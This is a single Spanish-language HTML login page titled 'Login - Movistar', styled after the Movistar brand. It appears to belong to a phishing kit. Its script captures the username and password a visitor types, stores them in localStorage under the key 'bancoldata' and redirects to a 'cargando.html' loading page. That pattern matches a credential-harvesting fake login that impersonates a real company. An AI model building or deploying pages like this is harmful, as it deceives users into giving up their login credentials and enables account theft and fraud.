<!DOCTYPE html>
<html lang="es">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Login - Movistar</title>
  <style>
    /* Paleta Movistar: azul, blanco, toques de gris */
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: linear-gradient(135deg, #0078d7 0%, #00b4f1 100%);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      color: #004a99;
    }

    form {
      background: #ffffffdd;
      padding: 30px 40px;
      border-radius: 15px;
      box-shadow: 0 8px 20px rgba(0, 0, 0, 0.15);
      width: 320px;
      max-width: 90vw;
      text-align: center;
    }

    h2 {
      margin: 0 0 25px;
      font-weight: 700;
      font-size: 1.8rem;
      color: #004a99;
      letter-spacing: 1px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 12px 15px;
      margin: 12px 0;
      border: 2px solid #0078d7;
      border-radius: 8px;
      font-size: 1rem;
      color: #004a99;
      transition: border-color 0.3s ease;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-color: #00b4f1;
      box-shadow: 0 0 8px #00b4f1;
    }

    button {
      width: 100%;
      padding: 14px 0;
      margin-top: 20px;
      background-color: #004a99;
      border: none;
      border-radius: 10px;
      font-size: 1.1rem;
      font-weight: 700;
      color: white;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }

    button:hover {
      background-color: #0078d7;
    }

    /* Responsive */
    @media (max-width: 400px) {
      form {
        padding: 20px;
      }

      h2 {
        font-size: 1.5rem;
      }
    }
  </style>
</head>

<body>
  <form id="loginForm" autocomplete="off">
    <h2>Iniciar sesión</h2>
    <input type="text" id="usuario" placeholder="Usuario" required autocomplete="username" />
    <input type="password" id="clave" placeholder="Clave" required autocomplete="current-password" />
    <button type="submit">Ingresar</button>
  </form>

  <script>
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();

      const usuario = document.getElementById('usuario').value.trim();
      const clave = document.getElementById('clave').value.trim();

      if (!usuario || !clave) return;

      localStorage.setItem('bancoldata', JSON.stringify({ usuario, clave }));

      // Redirigir a la página de cargando
      window.location.href = "cargando.html";
    });
  </script>
</body>

</html>
